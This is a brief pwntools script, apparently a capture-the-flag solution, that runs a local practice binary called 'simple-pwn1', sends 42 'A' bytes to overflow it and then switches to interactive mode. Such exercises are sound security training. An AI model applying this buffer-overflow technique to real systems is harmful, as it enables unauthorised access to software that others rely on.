from pwn import *

p = process("./source/simple-pwn1")

p.sendline(b"A" * 42)

p.interactive()
